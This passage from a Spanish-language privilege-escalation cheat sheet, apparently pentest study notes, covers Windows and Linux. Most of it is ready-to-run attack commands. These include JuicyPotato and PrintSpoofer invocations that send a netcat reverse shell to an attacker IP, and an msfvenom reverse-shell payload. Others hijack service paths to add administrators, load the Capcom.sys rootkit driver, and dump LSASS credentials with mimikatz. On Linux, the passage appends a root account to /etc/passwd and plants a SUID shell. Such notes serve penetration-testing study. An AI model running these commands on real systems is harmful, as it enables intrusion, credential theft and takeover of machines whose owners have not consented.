Sin embargo, esta herramienta tiene limitaciones: funciona en versiones de Windows hasta Windows Server 2016 y Windows 10, compilación 1809.

**Pasos para explotar el uso de JuicyPotato**:

1. **Configurar el listener con Netcat en la máquina atacante**:

```bash
rlwrap nc -lnvp 4444
```

2. **Ejecutar JuicyPotato en la máquina objetivo**:

```bash
c:\temp\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe 192.168.56.5 4444 -e cmd.exe" -t *
```

Explicación:

- `-l`: Especifica el puerto de escucha del servidor COM (53375 en este caso).
- `-p`: Programa a lanzar (en este caso, cmd.exe).
- `-a`: Argumento pasado a cmd.exe. Aquí, le indica a Netcat que se conecte a la máquina atacante y proporcione una reverse shell.
- `-t`: Especifica el `createprocess` a llamar, utilizando las funciones `CreateProcessWithTokenW` o `CreateProcessAsUser`, que requieren privilegios **SeImpersonate** o **SeAssignPrimaryToken**.

###### PrintSpoofer

> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*

> https://github.com/itm4n/PrintSpoofer

**PrintSpoofer** abusa del servicio **Spooler** de impresión de Windows y su interacción con named pipes (tuberías con nombre) para escalar privilegios. Explota una combinación de características y comportamientos del sistema operativo que permiten a un atacante suplantar el token de seguridad de un proceso que se ejecuta como SYSTEM.

**Pasos para explotar el código usando PrintSpoofer**:

1. Ejecutar PrintSpoofer:

```powershell
c:\temp\PrintSpoofer.exe -c "c:\temp\nc.exe 192.168.56.5 4444 -e cmd"
```

Explicación:

- `-c`: Especifica el comando que se ejecutará una vez que la escalada de privilegios sea exitosa. En este caso, se ejecuta Netcat (nc.exe) para proporcionar una reverse shell a la máquina atacante. 

###### RogueWinRM

> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*

> https://github.com/antonioCoco/RogueWinRM

**RogueWinRM** es una técnica de explotación que permite la escalada de privilegios en sistemas Windows aprovechando el servicio WinRM (Windows Remote Management). A diferencia de JuicyPotato, que se basa en la reflexión DCOM/NTLM, RogueWinRM abusa del servicio WinRM para ejecutar código con privilegios de SYSTEM. Esta técnica es particularmente útil en entornos donde JuicyPotato no funciona, como en Windows Server 2019 y versiones más recientes de Windows 10.

```powershell
.\RogueWinRM.exe -p "C:\temp\payload.exe"
```

###### SigmaPotato.exe

> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*

> https://github.com/tylerdotrar/SigmaPotato

```powershell
# Ejecutar un comando
./SigmaPotato.exe <command>


# Establecer una reverse shell con PowerShell
./SigmaPotato.exe --revshell <ip_addr> <port>
```
##### Autorun
Los Autorun en Windows son una característica que permite a los programas o scripts ejecutarse automáticamente cuando el sistema operativo se inicia o cuando se conecta un dispositivo externo, como una unidad USB o un disco óptico. Esta funcionalidad es útil para tareas automatizadas, pero también puede ser explotada por malware si no se configura correctamente.

**Carpetas a chequear**

```powershell
C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\Program Files\Autorun Program\
```
**Registros de Windows**

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```
Si hay algun programa de ejecución automática, es posible que pueda sobreescribirse el binario.

Podemos utilizar `accessckk.exe` de SysInternals o `icacls` para comprobar los permisos del directorio.

```powershell
icacls C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Si alguno de los archivos se puede escribir, se puede sobrescribir con una reverse shell o algun otro payload que nos permita escalar privilegios.

##### ACL de registro permisivas

Si una cuenta de usuario puede registrar servicios, entonces podemos crear un servicios malicioso para realizar una tarea privilegiada.

```powershell
PS C:\> accesschk.exe /accepteula "user" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\regsvc
        KEY_ALL_ACCESS

<SNIP>
```
###### Cambiar ImagePath con PowerShell

Podemos abusar de esto usando el cmdlet de PowerShell. `Set-ItemProperty` para cambiar el valor de `ImagePath`, usando un comando como:

```powershell-session
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\regsvc -Name "ImagePath" -Value "C:\Temp\nc.exe -e cmd.exe 192.168.56.5 4444"
```

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [C:\Temp\privesc.exe] /f
```

###### Nos ponemos en escucha con Netcat
```bash
rlwrap nc -lnvp 4444
```

###### Detemenos e Iniciamos el servicio

```powershell
sc.exe stop regsvc
sc.exe start regsvc
```

##### Servicios - `binPath`

Similar al ataque de permisos en los servicios, podemos comprobar los permisos de un servicio para ver si podemos modificarlo.

```powershell
accesschk.exe /accepteula -uwcqv <SERVICE>
```

Si tenemos el permiso `SERVICE_CHANGE_CONFIG` podemos manipular un servicio.

```powershell
sc.exe config <SERVICE> binpath= "net localgroup administrators user /add"
```

```
sc stop <SERVICE>
sc start <SERVICE>
```

##### Aplicaciones ejecutadas al inicio

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Si `BUILTIN\Users` tiene el privilegio `(F)`, podemos agregar un payload en esa ruta.
- Usamos `msfvenom` para generar una revese shell
- Colocamos la reverse shell en la carpeta
- Iniciamos un listener con Netcat
- Espere a que un Administrador inicie sesión

##### GUI Apps

Si una aplicación GUI está configurada para ejecutarse como administrador al iniciarse podemos abusar de esta para obtener una consola:

Por ejemplo: MS-Paint

- Archivo > Abrir -> Ingresar `file://C:/Windows/System32/cmd.exe`

##### SeDebugPrivilege

SeDebugPrivilege es un potente privilegio de Windows que permite al usuario depurar e interactuar con cualquier proceso que se esté ejecutando en el sistema, incluso aquellos que se ejecutan como SYSTEM. Este privilegio está diseñado principalmente para que desarrolladores y administradores depuren aplicaciones, pero puede explotarse para escalar privilegios.

Ejecutando el comando `whoami /priv`, podemos comprobar si el usuario actual tiene el privilegio SeDebugPrivilege. Si aparece en la lista, este privilegio puede usarse para abusar y acceder a ciertos procesos sensibles del sistema como LSASS o escalar privilegios inyectando código malicioso en estos procesos.

Si un usuario tiene SeDebugPrivilege , puede explotarlo para interactuar con procesos con privilegios elevados, especialmente aquellos que se ejecutan como SYSTEM. Al acceder a estos procesos, un atacante puede extraer información confidencial, como credenciales o contraseñas, u obtener el control total del sistema.

###### Volcado de LSASS para extraer credenciales

El Servicio del Subsistema de Autoridad de Seguridad Local (LSASS) se encarga de aplicar la política de seguridad en el sistema, gestionar los cambios de contraseña y validar el inicio de sesión de los usuarios. LSASS almacena las credenciales en memoria y, si SeDebugPrivilege está habilitado, se puede volcar para extraerlas.

Pasos para explotar el volcado de LSASS:

1. Utilizamos el binario de [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [suite SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite):

    `procdump.exe -accepteula -ma lsass.exe lsass.dmp`

Explicación:

- `-ma`: Captura un volcado de memoria completo del proceso `lsass.exe`.
- `lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.

Analizar el dump con Mimikatz :

```c
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Explicación:

- `sekurlsa::minidump`: Carga el archivo volcado.
- `sekurlsa::logonpasswords` Extrae credenciales del volcado.

##### Event Log Readers
El grupo **Event Log Readers** en Windows está disenñado para permitir que sus miembros lean los registros de eventos del sistema. Este grupo suele incluir a usuarios que necesitan monitorear o analizar eventos del sistema y aplicaciones sin otorgarles privilegios administrativos más amplios.

Privilegios Concedidos.

Los miembros del grupo **Event Logs Readers** tiene los siguientes privilegios:

1. **Leer Registros de Eventos**: Los usuarios pueden acceder y leer los registros de eventos generados por el sistema operativo Windows, aplicaciones y servicios.
2. **Ver Registros de Seguridad**: Estoy incluye acceso a eventos relacionados con la seguridad, que pueden contener información sensible como inicios de sesión de usuarios, cambios en cuentas y modificaciones en políticas de seguridad.

Riesgos de Escalación de Privilegios:

Aunque el grupo no otorga privilegios elevados de manera inherente, existen escenarios específicos en los que sus miembros podrían escalar sus privilegios:

1. **Análisis de Registros de Seguridad**:
    - Al revisar los registros de seguridad, un usuario podría indentificar información sensible, como credenciales de cuentas, bloqueos de cuentas o cambios reaizados por otros usuarios. Esta información podría ser utilizada para obtener acceso no autorizado a cuentas o sistemas.
2. **Identificación de Vulnerabilidades**:
    - Los usuarios pueden analizar los registros de eventos, para detectar configuraciones incorrectas o vulnerabilidades en el sistema. Por ejemplo, si un administrador inicia y cierra sesión con frecuencia o si hay múltiples intentos fallidos, esto podría indicar contraseñas débiles o cuentas mal protegidas.
3. **Enfoque en Otros Usuarios**:
    - La información de los registros de eventos puede ayudar a identificar cuentas con altos privilegios y sus patrones de actividad. Un atacante podría utilizar esta información para realizar ataques dirigidos, como phising o ingeniería social, contra esos usuarios.
4. **Explotación del Acceso a Registros para Otros Ataques**:
    - Si un usuario puede leer los registros de eventos, podría manipular servicios de registros u otros componentes para realizar acciones con mayores privilegios, especialemente si existen vulnerabilidades o configuraciones incorretas en esos servicios.

###### Búsqueda de registros de seguridad con wevtutil 

La utilidad `wevtutil` es una herramienta eficaz para administrar los registros de eventos de Windows. Permite consultarlos y recuperar información según criterios específicos. En este ejemplo, nos centraremos en consultar el registro de seguridad para encontrar eventos específicos relacionados con el usuario.

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Explicación:

- `wevtutil`: Esta es la utilidad de línea de comandos para la administración de eventos de Windows.
- `qe Security`: Esta opción específica que queremos consultar el registro de seguridad.
- `/rd:true`: Esta opción invierte el orden de eventos, mostrando primero los más recientes. Esto resulta útil para identificar rápidamente las actividades más recientes.
- `/f:text`: Esta opción específica el formato de la salida. En este caso, solicitamos la salida en texto plano.
- `| Select-String "/user"`: Esta parte del comando envía la salida al cmdlet `Select-String`, que filtra los resultados para incluir solo líneas que contiene la cadena `/user`. Esto es particularmente útil para identificar entradas de registro relacionadas con las acciones de la cuenta de registro.

###### Salida de ejemplo

El comando puede producir un resultado similar al siguiente:

```powershell
Process Command Line: net use T: \\dbs\backups /user:elliot Password123!
```

Interpretación de la salida

- La salida indica que se ejecutó un comando para establecer una conexión de red a `\\dbs\backups` utilizando el nombre de usuario (`elliot`) y la contraseña especificados (`Password123!`).
- Esta información puede ser crucial para el análisis de seguridad, ya que revela la actividad del usuario relacionada con los recursos compartidos de la red, lo que potencialmente podría indicar acceso no autorizado o uso indebido de credenciales.

##### Print Operators

El grupo **Print Opertaros** en Windows está destinado a usuarios que necesitan gestionar impresoras y trabajos de impresión. Los miembros de este grupo pueden realizar tareas como configurar impresoras, administrar colas de impresión y ejecutar funciones relacionadas con el servidor de impresión. Aunque estos permisos están enfocados en tareas de impresión, en determinadas circunstancias podrían ser explotados para escalar privilegios en un sistema Windows.

###### Escalada de Privilegios a través del Grupo de Operadores de Impresión y el Controlador Capcom.sys

El grupo **Print Operators** es un grupo con privilegios elevados en Windows que otorga a sus miembros permisos significativos, entre los que se incluyen:

- **SeLoadDriverPrivilege**: Permite a los miembros cargar y gestionar controladores del sistema.

- **Gestión de impresoras**: Capacidad para crear, compartir, administrar y eliminar impresoras conectadas a un controlador de dominio.

- **Acceso local a controladores de dominio**: Los miembros pueden iniciar sesión localmente en un controlador de dominio y apagarlo.

Estos privilegios permiten a los miembros del grupo cargar controladores del sistema, lo que puede ser explotado para realizar acciones con mayores privilegios en el sistema.

###### Uso de Capcom.sys para la Escalada de Privilegios

El controlador `Capcom.sys` es un controlador conocido que permite ejecutar código con privilegios de sistema. Este controlador puede ser utilizado para escalar privilegios en un entorno Windows. A continuación, se describe el proceso:

1. **Descargar el Controlador Capcom.sys**

    El controlador `Capcom.sys` puede descargarse desde el siguiente repositorio de GitHub:

    [Capcom-Rootkit - Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

    Además, se pueden encontrar herramientas útiles como `LoadDriver.exe` y `ExploitCapcom.exe` en el siguiente repositorio:

    [SeLoadDriverPrivilege - Josh Morrison](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)

2. **Crear un Ejecutable Malicioso**

    Utilizando Metasploit, creamos un ejecutable malicioso (por ejemplo, `rev.exe`) que proporcione un reverse shell al ejecutarse. Este ejecutable se ejecutará con privilegios elevados una vez que se cargue el controlador `Capcom.sys`.

    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > rev.exe
    ```

3. **Cargar el Controlador Capcom.sys**

    - Utilizamos la herramienta `LoadDriver.exe` para cargar el controlador `Capcom.sys`. El comando a ejecutar es el siguiente:

    ```powershell
    .\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\Test\Capcom.sys
    ```

    - Si la ejecución es exitosa, el comando debería devolver:

    ```powershell
    NTSTATUS: 00000000, WinError: 0
    ```

    - Si no es así, verifique la ubicación de Capcom.sys y asegúrese de que está ejecutando `LoadDriver.exe` desde el directorio correcto.

4. **Ejecutar el Ejecutable Malicioso**

    - Una vez cargado el controlador, utilizamos `ExploitCapcom.exe` para ejecutar el ejecutable malicioso con privilegios elevados:
 
    ```powershell
    .\ExploitCapcom.exe C:\Temp\rev.exe
    ```
    - Este comando ejecutará el archivo `rev.exe` con privilegios de sistema, proporcionando al atacante un reverse shell.

##### SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege es un privilegio de Windows que permite a los usuarios tomar posesión de objetos, como archivos, carpetas  claves de registro, incluso sin permisos explícitos. Una vez toma la propiedad, el usuario puede modificar los permisos del objeto para obtener control total, eludiendo así las restricciones de acceso.

Podemos utilizar el comando `whoami /priv` para comprobar si el privilegio `SeTakeOwnershipPrivilege` esta habilitado.

Explotación del privilegio `SeTakeOwnershipPrivilege`.

Si un usuario tiene el privilegio `SeTakeOwnershipPrivilege`, puede tomar el control de objetos sensibles, como archivos del sistema o procesos críticos y modificar sus permisos para obtener acceso o ejecutar comandos arbitrarios. A continuación, se explica cómo abusar de este privilegio para escalar privilegios.

```powershell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
```

Si el privilegio está deshabilitado, podemos habilitarlo usando este script [Enable-Privilege.ps1](https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1).

```powershell
PS C:\temp> Import-Module .\Enable-Privilege.ps1
PS C:\temp> .\EnableAllTokenPrivs.ps1
PS C:\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

###### Toma de propiedad de archivos o directorios

`SeTakeOwnershipPrivilege` permite cambiar la propiedad de un archivo o directorio, lo que permite modificar o acceder a archivos restringidos. Tras tomar posesión, puede modificar su Lista de Control de Acceso Discrecional (DACL) para obtener control total.

Pasos para explotar `SeTakeOwnershipPrivilege` en archivos:

1. **Tomar propiedad de un archivo o directorio**:

Utilizamos el comando `takeown` para tomar propiedad de un archivo o directorio.

```powershell
takeown /F <file_or_directory>
```

Ejemplo:

```powershell
takeown /F C:\Windows\System32\drivers\etc\hosts
```

Este comando cambia la propiedad del archivo especificado a la cuenta del usuario actual.

2. **Conceder control total sobre el archivo**:

Después de tomar propiedad, modificamos los permisos del archivo usando el comando `icacls` para otorgarnos propiedad total.

```powershell
icacls <file_or_folder> /grant /<username>:F
```

Ejemplo:

```powershell
icacls C:\Windows\System32\drivers\etc\hosts /grant /<username>:F
```

- `/grant` Otorga control total (F) sobre el archivo al usuario especificado.

3. **Modificar o acceder al archivo**:

Tras obtener control total, podemos editar, eliminar o acceder al archivo según sea necesario.
Por ejemplo, podemos modificar archivos confidenciales del sistema como `hosts`, o incluso reemplazar ejecutables del sistema por otros maliciosos para obtener privilegios de nivel de SYSTEM.

Algunos archivos locales de interés pueden incluir:

```powershell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

###### Toma de propiedad de las claves de registro

También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad y los permisos de claves de registro críticas, lo que permite aumentar los privilegios.

**Pasos para explotar claves de registro**:

1. **Tomar propiedad de una clave de registro**:

    Utilizamos `regedit` o `Powershell` para cambiar la propiedad de una clave de registro. Podemos asumir la propiedad de claves confidenciales, como las relacionadas con cuentas de usuarios, servicios o configuraciones de inicio.

    Ejemplo en Powershell:

    ```powershell
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "<key>" -Value "<value>"
    ```

    Esto cambia la propiedad de la clave, lo que permite modificar la configuración de inicio u otras configuraciones críticas.

2. **Modificar permisos**:

    Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.

###  10.2. <a name='linux-2'></a>Linux

####  10.2.1. <a name='enumeración-2'></a>Enumeración

##### Sistema

```bash
hostname
hostname -I
uname -a
w
lastlog
cat /etc/issue
cat /etc/os-release
cat /proc/version
cat /etc/shells
sudo -V
ps aux
df -h
mount
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
lscpu
lsblk
lsmod
/sbin/modinfo libata
```

##### Red

```bash
ip a
ifconfig
route
arp -a
ip route
ip neigh
ss -anp
netstat -net
netstat -ano
cat /etc/hosts
cat /etc/iptables/rules.v4
```

##### Usuarios y Grupos

```bash
whoami
id
env
history
cat .bashrc
cat /etc/passwd
cat /etc/passwd | grep "sh$"
grep "sh$" /etc/passwd | awk '{print $1}' FS=":"
cat /etc/shadow
cat /etc/group
getent group sudo
sudo -l
```

###### Algoritmos más utilizados

| Algoritmo | Hash |
| --------- | ---- |
| Salted MD5 | $1$... |
| SHA-256 | $5$... |
| SHA-512 | $6$... |
| BCrypt | $2a$... |
| Scrypt | $7$... |
| Argon2 | $argon2i$... |

##### Tareas Cron

```bash
crontab -l
sudo crontab -l
cat /var/log/syslog
ls -lah /etc/cron*
```

##### Capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

##### Archivos y Directorios

```bash
ls -l /tmp /var/tmp /dev/shm
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep student
find / -type d -name ".*" -ls 2>/dev/null
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

##### Búsqueda de credenciales

```bash
locate password | more
find / type f -name wp-config.php -exec grep -E "DB_PASSWORD|DB_USER|DB_NAME" {} \; 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -name password 2>/dev/null -exec ls -l {} \; 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
grep -rnw '/' -ie "PASSWORD" –color=always 2>/dev/null
```
##### Binarios y Paquetes instalados

```bash
dpkg -l
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/
```

##### Procesos y Servicios

```bash
strace
ps aux | grep root
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

##### Búsqueda de claves SSH

```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

##### Archivos con permisos de escritura

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/.backups/script.sh
```
##### Abusando de Permisos inseguros

Si por alguna razón podemos escribir en el archivo `/etc/passwd`, generamos el hash correspondiente y agregamos una línea a `/etc/passwd` usando el formato apropiado:

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su - root2
```

##### Automatización

- [Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20230108)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)


####  10.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios

> Referencias: https://gtfobins.github.io/

##### SUID

**Set User ID (SUID)** es un permiso especial en sistemas Unix/Linux. Cuando un archivo tiene el bit SUID establecido, permite que se ejecute con los privilegios de su propietario, independientemente del usuario que lo ejecute. Se suele utilizar para otorgar a usuarios normales permisos elevados temporales para ejecutar tareas específicas.

![SUID](./img/suid.png)

Indicado por `rws` para el permiso del propietario. Cuando el bit SUID (Set User ID) está activado (representado por una `s` en lugar de una `x` en el permiso de ejecución), cualquier usuario que ejecute este archivo lo hará con los permisos del propietario del archivo. Esto se utiliza comúnmente cuando un archivo es propiedad de root, pero permite que usuarios regulares lo ejecuten con privilegios de superusuario.

Los siguientes tres caracteres (`rws`) representan los permisos para el grupo propietario del archivo. Al igual que con los permisos del propietario, se otorgan o deniegan los permisos de lectura (`r`), escritura (`w`) y ejecución (`x`) para el grupo. Cuando el bit GUID (Set Group ID) está activado, el bit de ejecución (`x`) para el grupo se reemplaza por una `s`, lo que indica que el archivo se ejecutará con los privilegios del grupo propietario.

El GUID es similar al SUID, pero se aplica al grupo. Permite que cualquier usuario que ejecute el archivo lo haga con los permisos del grupo propietario. En este ejemplo, el permiso del grupo incluye una `s`, lo que muestra que el bit GUID está activado.

###### Cómo identificar archivos SUID 

Los archivos SUID se pueden identificar buscando archivos con el bit `s` en el campo de permiso de ejecución del propietario. 

```bash
find / -perm -4000 2>/dev/null
```

Ejemplo:

```bash
-rwsr-xr-x 1 root root /usr/bin/passwd
```

En este ejemplo:

- `rws`: Indica que el bit SUID está establecido.
- El propietario es `root`, lo que significa que cualquier usuario que ejecute este archivo lo hace con privilegios de `root`.

###### Cómo explotar binarios SUID para escalar privilegios. 

Algunos binarios esenciales en sistemas Linux, como su, sudo y passwd, suelen tener el bit SUID activado por defecto. Estos binarios son fundamentales para el funcionamiento del sistema y, en general, se consideran seguros. Sin embargo, el riesgo de vulnerabilidades aumenta cuando se trata de binarios de terceros o menos comunes. Para identificar posibles métodos de explotación, una excelente primera aproximación es consultar [GTFOBins](https://gtfobins.github.io/), un recurso invaluable que recopila técnicas para aprovechar binarios con permisos especiales, como **SUID**.

[GTFOBins SUID](https://gtfobins.github.io/#+suid)

Por ejemplo, si el bit SUID está habilitado en un binario como Python, es posible explotarlo para escalar privilegios en el sistema. A continuación, se describe un caso práctico:

**Verificar si Python tiene el bit SUID activado**

Para comprobar si Python tiene el bit SUID configurado, ejecuta el siguiente comando:

```bash
ls -l /usr/bin/python
```

Si el bit SUID está activado, verás una salida similar a esta:

```bash
-rwsr-xr-x 1 root root /usr/bin/python
```

La `s` en los permisos del propietario (rws) indica que el bit SUID está habilitado.

**Explotar Python para escalar privilegios**

Si Python tiene el bit SUID activado, podemos ejecutar una línea de código para obtener una shell con privilegios de root:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-i")'
```

Este comando utiliza Python para lanzar una shell interactiva (`/bin/bash`) con los permisos del propietario del archivo, en este caso, `root`.

##### Sudo

Los privilegios de sudo pueden ser asignados a una cuenta, permitiendo que dicha cuenta ejecute comandos específicos en el contexto de root (u otro usuario) sin necesidad de cambiar de usuario o otorgar privilegios excesivos. Cuando se ejecuta el comando sudo, el sistema verifica si el usuario que lo ejecuta tiene los permisos adecuados, según la configuración definida en el archivo /etc/sudoers.

Al acceder a un sistema, siempre es recomendable verificar si el usuario actual tiene privilegios de sudo. Esto se puede hacer ejecutando el comando:

```bash
sudo -l
```

Este comando lista los comandos que el usuario puede ejecutar con sudo. En algunos casos, es posible que se requiera la contraseña del usuario para mostrar esta información. Sin embargo, si hay entradas en la configuración de sudo que incluyen la opción NOPASSWD, estos permisos se mostrarán sin necesidad de ingresar una contraseña.

[GTFOBins SUDO](https://gtfobins.github.io/#+sudo)

Ejemplo `tar`:

![Sudo - Tar](./img/tar-sudo.png)

##### Capabilities
Las **Capabilities** de Linux son una característica de seguridad del sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más preciso sobre qué procesos tienen acceso a ciertos privilegios, haciéndolo más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos. 

A continuación se muestran algunas capacidades comunes disponibles en Linux: 

| Capability               | Descripción                                                                 |
|-------------------------|-----------------------------------------------------------------------------|
| **CAP_SYS_ADMIN**       | Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. administrativas.                         |
| **CAP_CHOWN**           | Cambiar la propiedad de archivos.                                           |
| **CAP_DAC_OVERRIDE**    | Ignorar las verificaciones de permisos de lectura, escritura y ejecución de archivos. |
| **CAP_DAC_READ_SEARCH** | Ignorar las verificaciones de permisos de lectura de archivos.              |
| **CAP_FOWNER**          | Ignorar las verificaciones de permisos que normalmente requieren ser el propietario del archivo. |
| **CAP_NET_ADMIN**       | Realizar diversas operaciones relacionadas con la red, como configurar interfaces. |
| **CAP_NET_BIND_SERVICE**| Vincular (bind) a puertos de red por debajo del 1024.                        |
| **CAP_SYS_MODULE**      | Cargar y descargar módulos del kernel.                                      |
| **CAP_SYS_RAWIO**       | Realizar operaciones de entrada/salida (I/O) a bajo nivel.                  |
| **CAP_SYS_TIME**        | Modificar el reloj del sistema.                                             |

###### Asignar una Capability

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

###### Eliminar una Capability

```bash
sudo setcap cap_net_bind_service=-ep /usr/bin/vim.basic
```

A continuación se muestran algunos ejemplos de valores que podemos utilizar con el comando `setcap`, junto con una breve descripción de lo que hacen: 

| Valor | Descripción                                                                                   |
|-------|-----------------------------------------------------------------------------------------------|
| `=`   | Establece la capacidad especificada para el ejecutable, pero **no otorga ningún privilegio**. Útil para borrar capacidades previamente asignadas. |
| `+ep` | Otorga al ejecutable los privilegios **efectivos** y **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas por la capacidad, pero no otras. |
| `+ei` | Otorga al ejecutable privilegios **efectivos** e **heredables** para la capacidad especificada. Permite que el ejecutable y los procesos secundarios hereden la capacidad y realicen las acciones permitidas. |
| `+p`  | Otorga al ejecutable los privilegios **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas, pero evita que la capacidad sea heredada por procesos secundarios. |

En Linux, se pueden utilizar diversas capacidades (capabilities) para escalar los privilegios de un usuario hasta obtener acceso de root. Estas capacidades permiten a los procesos realizar acciones específicas que normalmente están restringidas a usuarios con privilegios elevados. A continuación, se describen algunas de las capacidades más relevantes para este propósito:

| Capability         | Descripción                                                                                   |
|-------------------|-----------------------------------------------------------------------------------------------|
| **CAP_SETUID**    | Permite que un proceso establezca su **ID de usuario efectivo**, lo que puede usarse para obtener los privilegios de otro usuario, incluido **root**. |
| **CAP_SETGID**    | Permite que un proceso establezca su **ID de grupo efectivo**, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo **root**. |
| **CAP_SYS_ADMIN** | Proporciona una amplia gama de privilegios administrativos, como modificar la configuración del sistema, montar y desmontar sistemas de archivos, y realizar otras acciones reservadas para el usuario **root**. |
| **CAP_DAC_OVERRIDE** | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos, lo que facilita el acceso a archivos restringidos. |

###### Enumerar binarios con capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

###### Explotación

Si hay capability configuradas en un binario, podemos usar esta capability para escalar privilegios.
Por ejemplo, si se establece la capability `CAP_SETUID`, esto se puede usar como una puerta trasera para mantener el acceso privilegiado manipulando su propio UID de proceso.

```bash
cp $(which python) .
sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

> Referencias: [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities)

##### Tareas Cron
Los trabajos Cron son tareas programadas en sistemas Unix/Linux que se ejecutan automáticamente en intervalos específicos. Sin embargo, si no están configurados correctamente, pueden convertirse en un vector de ataque para escalar privilegios o ejecutar código malicioso. A continuación, se describen técnicas comunes para explotar vulnerabilidades en trabajos Cron:

![Tareas Cron](/img/cron.png)

Podemos verificar si una tarea cron está activa usando [Pspy](https://github.com/DominicBreuker/pspy), una utilidad de línea de comandos que nos permite observar los procesos en ejecución sin necesidad de acceso root. Esta herramienta nos permite monitorear los comandos ejecutados por otros usuarios, incluyendo tareas cron. Funciona escaneando el sistema de archivos `procfs`. Para usar pspy, podemos ejecutar el siguiente comando:

```bash
./pspy64
``` 

**Identificación de trabajos cron**

Para ver trabajos cron específicos del usuario, podemos utilizar el comando:

```bash
crontab -l
```

